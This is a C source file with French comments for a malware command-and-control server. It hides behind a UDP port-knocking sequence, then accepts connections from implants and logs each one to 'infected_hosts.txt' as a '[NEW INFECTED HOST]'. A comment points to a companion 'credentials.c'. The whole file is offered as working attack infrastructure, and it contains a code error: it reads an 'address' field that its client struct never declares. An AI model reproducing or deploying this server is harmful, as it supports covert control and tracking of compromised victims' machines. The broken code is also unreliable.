#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <sys/select.h>

#define PORT 8080  // Doit correspondre au port défini dans credentials.c
#define BUFFER_SIZE 4096
#define MAX_CLIENTS 100
#define KNOCK_PORT1 1234
#define KNOCK_PORT2 2345
#define KNOCK_PORT3 3456

int server_ready = 0;  // Variable pour indiquer si le serveur est prêt

struct client_info {
    int socket;
};

// Fonction pour obtenir un timestamp
const char *get_timestamp() {
    static char timestamp[64];
    time_t now = time(NULL);
    struct tm *tm_info = localtime(&now);
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", tm_info);
    return timestamp;
}

// Fonction pour afficher les données reçues en hexadécimal (optionnel pour debug)
void print_hex(const char *data, int length) {
    printf("[HEX] ");
    for (int i = 0; i < length; i++) {
        printf("%02X ", (unsigned char)data[i]);
    }
    printf("\n");
    fflush(stdout);
}

// Fonction de gestion des clients
void *handle_client(void *arg) {
    struct client_info *client = (struct client_info *)arg;
    int sock = client->socket;
    struct sockaddr_in client_addr = client->address;
    free(client);

    char buffer[BUFFER_SIZE];

    memset(buffer, 0, BUFFER_SIZE);
    int bytes_received = recv(sock, buffer, BUFFER_SIZE - 1, 0);
    if (bytes_received > 0) {
        buffer[bytes_received] = '\0';
        printf("[NEW INFECTED HOST] %s from %s\n", buffer, inet_ntoa(client_addr.sin_addr));

        FILE *log_file = fopen("infected_hosts.txt", "a");
        if (log_file) {
            fprintf(log_file, "[%s] Host: %s, IP: %s\n", get_timestamp(), buffer, inet_ntoa(client_addr.sin_addr));
            fclose(log_file);
        } else {
            perror("Failed to open log file");
        }
    }
    close(sock);
    return NULL;
}

// Fonction pour gérer les knocks
void handle_knock(int port) {
    static int expected_ports[] = {KNOCK_PORT1, KNOCK_PORT2, KNOCK_PORT3};
    static int current_knock = 0;

    if (port == expected_ports[current_knock]) {
        current_knock++;
        if (current_knock == 3) {
            server_ready = 1;  // La séquence est correcte, le serveur est prêt
        }
    } else {
        current_knock = 0;  // Réinitialiser la séquence en cas d'erreur
    }
}

// Fonction pour écouter les ports de knocking
void listen_knocking() {
    int sockfd;
    struct sockaddr_in servaddr;
    char buffer[1024];

    // Création du socket UDP
    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Erreur socket");
        exit(EXIT_FAILURE);
    }

    // Configuration de l'adresse du serveur
    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = INADDR_ANY;
    
    // On va écouter sur les trois ports en même temps
    int knock_ports[3] = {KNOCK_PORT1, KNOCK_PORT2, KNOCK_PORT3};
    int knock_sockets[3];

    // Ouvrir un socket pour chaque port
    for (int i = 0; i < 3; i++) {
        servaddr.sin_port = htons(knock_ports[i]);
        if ((knock_sockets[i] = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
            perror("Erreur socket");
            exit(EXIT_FAILURE);
        }
        if (bind(knock_sockets[i], (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0) {
            perror("Erreur bind");
            exit(EXIT_FAILURE);
        }
    }

    printf("[KNOCK] En attente de séquence...");

    fd_set readfds;
    int max_fd = 0;
    
    // Détecter les knocks dans l'ordre
    while (!server_ready) {
        FD_ZERO(&readfds);

        // Ajouter chaque socket à la liste des fichiers surveillés
        for (int i = 0; i < 3; i++) {
            FD_SET(knock_sockets[i], &readfds);
            if (knock_sockets[i] > max_fd) {
                max_fd = knock_sockets[i];
            }
        }

        struct timeval timeout;
        timeout.tv_sec = 10;  // Timeout pour éviter de rester bloqué indéfiniment
        timeout.tv_usec = 0;

        int activity = select(max_fd + 1, &readfds, NULL, NULL, &timeout);
        if (activity < 0) {
            perror("Erreur select");
            exit(EXIT_FAILURE);
        }

        // Vérifier quel port a reçu un knock
        for (int i = 0; i < 3; i++) {
            if (FD_ISSET(knock_sockets[i], &readfds)) {
                struct sockaddr_in cliaddr;
                socklen_t len = sizeof(cliaddr);
                int n = recvfrom(knock_sockets[i], buffer, 1024, 0, (struct sockaddr *)&cliaddr, &len);
                if (n > 0) {
                    handle_knock(knock_ports[i]);
                }
            }
        }
    }

    printf("[KNOCK] Séquence correcte ! Le serveur C2 est maintenant actif.");

    // Fermer les sockets de knocking
    for (int i = 0; i < 3; i++) {
        close(knock_sockets[i]);
    }
}

// Fonction principale du serveur C2
int main() {
    listen_knocking();

    int server_sock;
    struct sockaddr_in server_addr;
    server_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (server_sock < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    if (bind(server_sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Bind failed");
        close(server_sock);
        exit(EXIT_FAILURE);
    }

    if (listen(server_sock, MAX_CLIENTS) < 0) {
        perror("Listen failed");
        close(server_sock);
        exit(EXIT_FAILURE);
    }

    printf("[C2] Serveur actif sur le port %d...\n", PORT);

    while (1) {
        struct sockaddr_in client_addr;
        socklen_t client_len = sizeof(client_addr);
        int client_sock = accept(server_sock, (struct sockaddr *)&client_addr, &client_len);
        if (client_sock < 0) {
            perror("Accept failed");
            continue;
        }

        printf("[+] Nouveau client connecté depuis %s:%d\n",
               inet_ntoa(client_addr.sin_addr),
               ntohs(client_addr.sin_port));

        struct client_info *client = malloc(sizeof(struct client_info));
        if (!client) {
            perror("Failed to allocate memory for client info");
            close(client_sock);
            continue;
        }

        client->socket = client_sock;

        pthread_t thread_id;
        if (pthread_create(&thread_id, NULL, handle_client, (void *)client) != 0) {
            perror("Failed to create thread");
            close(client_sock);
            free(client);
        } else {
            pthread_detach(thread_id);
        }
    }

    close(server_sock);
    return 0;
}